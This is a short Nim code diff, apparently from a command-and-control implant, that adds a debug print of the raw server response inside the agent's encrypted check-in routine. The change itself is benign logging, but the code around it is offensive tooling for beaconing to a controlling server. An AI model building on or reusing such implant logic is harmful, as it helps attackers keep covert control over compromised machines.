@@ -54,6 +54,10 @@ proc checkIn: Future[bool] {.async.} =
         # Send initial checkin and parse json response into JsonNode
         let temp = when defined(AESPSK): await Fetch(curConfig, data, true) else: decode(await Fetch(curConfig, data, true))
 
+        # Huzzah for random debug lines
+        when not defined(release):
+            echo "raw response: ", temp
+
         var resp = parseJson(temp[36 .. ^1])
         when not defined(release):
             echo "resp from checkin: ", resp
